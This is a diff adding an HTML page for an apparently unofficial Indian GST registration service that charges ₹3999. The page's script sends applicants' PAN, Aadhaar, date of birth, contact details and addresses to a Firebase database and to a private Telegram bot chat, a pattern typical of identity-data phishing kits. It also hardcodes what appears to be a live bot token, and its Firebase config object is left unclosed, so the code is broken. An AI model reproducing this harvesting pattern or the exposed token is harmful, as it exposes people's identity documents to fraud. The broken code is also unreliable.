@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GST Registration Form - Details & Telegram</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #007bff;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        .charge-info {
+            text-align: center;
+            color: #e44d26;
+            font-weight: bold;
+            margin-bottom: 25px;
+            padding: 15px;
+            border: 2px solid #ffbb99;
+            background-color: #fff0e6;
+            border-radius: 4px;
+        }
+        fieldset {
+            border: 1px solid #ccc;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+        legend {
+            font-size: 1.3em;
+            font-weight: bold;
+            color: #007bff;
+            padding: 0 10px;
+            background-color: #fff;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], input[type="tel"], textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .document-required-box {
+            border: 1px dashed #007bff;
+            padding: 10px;
+            background-color: #e6f0ff;
+            border-radius: 4px;
+            margin-top: 5px;
+            font-size: 0.95em;
+        }
+        button[type="submit"] {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button[type="submit"]:hover {
+            background-color: #218838;
+        }
+        #statusMessage {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: center;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Basic & Business Details Application</h1>
+        <p class="charge-info">
+            ✅ **Application Fee: ₹3999**<br>
+            डिटेल्स सेव होने के बाद, हमारी टीम **आगे की दस्तावेज़ प्रक्रिया और शुल्क** के लिए आपसे संपर्क करेगी।
+        </p>
+
+        <form id="applicationForm">
+
+            <fieldset>
+                <legend>Basic Details</legend>
+                <div class="form-group">
+                    <label for="applicantName">Applicant's Name *</label>
+                    <input type="text" id="applicantName" placeholder="Enter Applicant's Name" required>
+                </div>
+                <div class="form-group">
+                    <label for="fatherName">Father's Name *</label>
+                    <input type="text" id="fatherName" placeholder="Enter Father's Name" required>
+                </div>
+                <div class="form-group">
+                    <label for="pan">PAN *</label>
+                    <input type="text" id="pan" value="AAAPA1234K" placeholder="AAAPA1234K" required>
+                </div>
+                <div class="form-group">
+                    <label for="dob">Date Of Birth (dd-mm-yyyy) *</label>
+                    <input type="text" id="dob" placeholder="DD-MM-YYYY" required>
+                </div>
+                <div class="form-group">
+                    <label for="aadhaar">Aadhaar Card/Enrollment Number *</label>
+                    <input type="text" id="aadhaar" value="3333-9999-1111" placeholder="3333-9999-1111" required>
+                </div>
+                <div class="form-group">
+                    <label for="mobile">Mobile Number *</label>
+                    <input type="tel" id="mobile" value="1234567890" placeholder="1234567890" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Id *</label>
+                    <input type="email" id="email" placeholder="Enter Email Id" required>
+                </div>
+                <div class="form-group">
+                    <label for="resAddress">Applicant's Residential Address (as per Aadhar Card) *</label>
+                    <textarea id="resAddress" placeholder="Enter Applicant's Residential Address" required></textarea>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Required Documents (Details Only)</legend>
+                <p class="document-heading">कृपया ध्यान दें: इन दस्तावेज़ों की ज़रूरत होगी, लेकिन इन्हें अभी अपलोड न करें।</p>
+                
+                <div class="form-group">
+                    <label>Passport Size Photo (Only JPEG less than 2MB) *</label>
+                    <div class="document-required-box">
+                        **आवश्यक:** JPEG फ़ाइल (2MB से कम)। यह दस्तावेज़ बाद में Cloudflare पर अपलोड होगा।
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Upload PAN Card (less than 2MB)</label>
+                    <div class="document-required-box">
+                        **आवश्यक:** PDF, JPEG, Excel, Zip, या Doc फ़ाइल। यह दस्तावेज़ बाद में Cloudflare पर अपलोड होगा।
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Cancelled Cheque or First Page of Passbook (less than 2MB)</label>
+                    <div class="document-required-box">
+                        **आवश्यक:** PDF, JPEG, Excel, Zip, या Doc फ़ाइल। यह दस्तावेज़ बाद में Cloudflare पर अपलोड होगा।
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Upload electricity bill (not older than 2 months) *</label>
+                    <div class="document-required-box">
+                        **आवश्यक:** PDF, JPEG, Excel, Zip, या Doc फ़ाइल। यह दस्तावेज़ बाद में Cloudflare पर अपलोड होगा।
+                    </div>
+                </div>
+            </fieldset>
+
+            <fieldset>
+                <legend>Business Details</legend>
+                <div class="form-group">
+                    <label for="businessName">Business Name / Shop Name</label>
+                    <input type="text" id="businessName" placeholder="Enter Business Name">
+                </div>
+                <div class="form-group">
+                    <label for="commencementDate">Business Commencement Date *</label>
+                    <input type="text" id="commencementDate" placeholder="DD-MM-YYYY" required>
+                </div>
+                <div class="form-group">
+                    <label for="businessAddress">Business Address *</label>
+                    <textarea id="businessAddress" placeholder="Enter Business Address" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="businessNature">Nature of Business Activities to be carried *</label>
+                    <input type="text" id="businessNature" placeholder="Eg.:- Jewellery Business, Consultancy Services, Footwear Business, etc." required>
+                </div>
+                <div class="form-group">
+                    <label for="businessType">Type of Business Property *</label>
+                    <select id="businessType" required>
+                        <option value="">Select</option>
+                        <option value="owned">Owned</option>
+                        <option value="rented">Rented</option>
+                        <option value="leased">Leased</option>
+                    </select>
+                </div>
+            </fieldset>
+
+            <div class="form-group" style="display: flex; align-items: center;">
+                <input type="checkbox" id="terms" required style="width: auto; margin-right: 10px;">
+                <label for="terms" style="font-weight: normal;">I accept all terms and conditions.</label>
+            </div>
+
+            <button type="submit">Submit Details to Firebase & Telegram</button>
+            <div id="statusMessage" style="color: green;"></div>
+        </form>
+    </div>
+
+    <script>
+        // =========================================================================
+        //                         CONFIGURATION SECTION
+        // =========================================================================
+
+        // ⚠️ 1. FIREBASE CONFIG: REPLACE WITH YOUR ACTUAL PROJECT DETAILS
+        const firebaseConfig = {
+   
+
+
+
+
+
+
+
+
+
+        // ⚠️ 2. TELEGRAM CONFIG: REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
+        //    (Chat ID can be a group ID or a user ID)
+        const TELEGRAM_BOT_TOKEN = "7840966662:AAHqRQbwMOk6ja6pewc3fBMkGUAF7ZKb8ZE"; // Example: 1234567890:AABBCCDDeeFFgghhIIJJKKllMMNN00P
+        const TELEGRAM_CHAT_ID = "7918796164";     // Example: -1001234567890 (for a group) or 123456789 (for a user)
+
+
+        // =========================================================================
+        //                            CORE LOGIC
+        // =========================================================================
+
+        // Initialize Firebase
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+
+        const database = firebase.database();
+        const form = document.getElementById('applicationForm');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        const documentPlaceholders = {
+            passportPhoto_Required: "Yes (JPEG < 2MB)",
+            panDocument_Required: "Yes (PDF/JPEG/Doc/Excel/Zip < 2MB)",
+            chequePassbook_Required: "Yes (PDF/JPEG/Doc/Excel/Zip < 2MB)",
+            electricityBill_Required: "Yes (Not older than 2 months < 2MB)",
+            documentUploadMethod: "Contact required - Upload to Cloudflare via separate process"
+        };
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            // Format the data into a readable message string
+            let message = "🚨 **NEW GST APPLICATION SUBMITTED** 🚨\n\n";
+            message += `**Applicant Name:** ${data.applicantName}\n`;
+            message += `**Mobile:** ${data.mobile}\n`;
+            message += `**Email:** ${data.email}\n`;
+            message += `**PAN:** ${data.pan}\n`;
+            message += `**Aadhaar:** ${data.aadhaar}\n`;
+            message += `**DOB:** ${data.dob}\n`;
+            message += `**Residential Address:** ${data.resAddress}\n`;
+            message += `--------------------------------------\n`;
+            message += `**Business Name:** ${data.businessName}\n`;
+            message += `**Commencement Date:** ${data.commencementDate}\n`;
+            message += `**Business Type:** ${data.businessType}\n`;
+            message += `**Nature:** ${data.businessNature}\n`;
+            message += `--------------------------------------\n`;
+            message += `**Fee Status:** ${data.applicationFee} (Contact Required)\n`;
+            message += `**Submission Time:** ${new Date().toLocaleString()}\n`;
+            message += `**DB Node:** gst_registration\n`;
+            
+            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const response = await fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown', // Use Markdown for bold/formatting
+                }),
+            });
+
+            if (!response.ok) {
+                console.error("Telegram API Error:", await response.text());
+                throw new Error("Failed to send notification to Telegram.");
+            }
+            console.log("Notification successfully sent to Telegram.");
+        }
+
+
+        // --- Form Submission Handler ---
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            statusMessage.textContent = 'Processing and saving data to Firebase and Telegram...';
+            statusMessage.style.backgroundColor = '#ffc';
+            statusMessage.style.color = '#333';
+
+            try {
+                // 3. Prepare Data Object
+                const formData = {
+                    applicantName: document.getElementById('applicantName').value,
+                    fatherName: document.getElementById('fatherName').value,
+                    pan: document.getElementById('pan').value,
+                    dob: document.getElementById('dob').value,
+                    aadhaar: document.getElementById('aadhaar').value,
+                    mobile: document.getElementById('mobile').value,
+                    email: document.getElementById('email').value,
+                    resAddress: document.getElementById('resAddress').value,
+                    businessName: document.getElementById('businessName').value,
+                    commencementDate: document.getElementById('commencementDate').value,
+                    businessAddress: document.getElementById('businessAddress').value,
+                    businessNature: document.getElementById('businessNature').value,
+                    businessType: document.getElementById('businessType').value,
+
+                    documentsRequired: documentPlaceholders,
+                    submissionDate: new Date().toISOString(),
+                    processingStatus: 'Details Collected - Awaiting Document Upload & Contact for Fee',
+                    applicationFee: '₹3999'
+                };
+
+                // 4. Perform Firebase and Telegram submissions simultaneously
+                await Promise.all([
+                    // Save Data to Firebase Realtime Database
+                    database.ref('gst_registration').push(formData),
+                    
+                    // Send Data to Telegram
+                    sendToTelegram(formData)
+                ]);
+
+                // 5. Success Message
+                statusMessage.textContent = '✅ डिटेल्स सफलतापूर्वक सेव हो गईं! डेटा Firebase और Telegram पर भेज दिया गया है। हमारी टीम दस्तावेज़ और शुल्क (₹3999) के लिए जल्द ही आपसे संपर्क करेगी।';
+                statusMessage.style.backgroundColor = '#d4edda';
+                statusMessage.style.color = '#155724';
+                form.reset(); // Clear the form
+
+            } catch (error) {
+                console.error("Submission Error:", error);
+                statusMessage.textContent = `❌ सबमिशन विफल रहा: ${error.message}. कृपया अपनी Firebase/Telegram कॉन्फ़िगरेशन जांचें।`;
+                statusMessage.style.backgroundColor = '#f8d7da';
+                statusMessage.style.color = '#721c24';
+            }
+        });
+    </script>
+</body>
+</html>
+
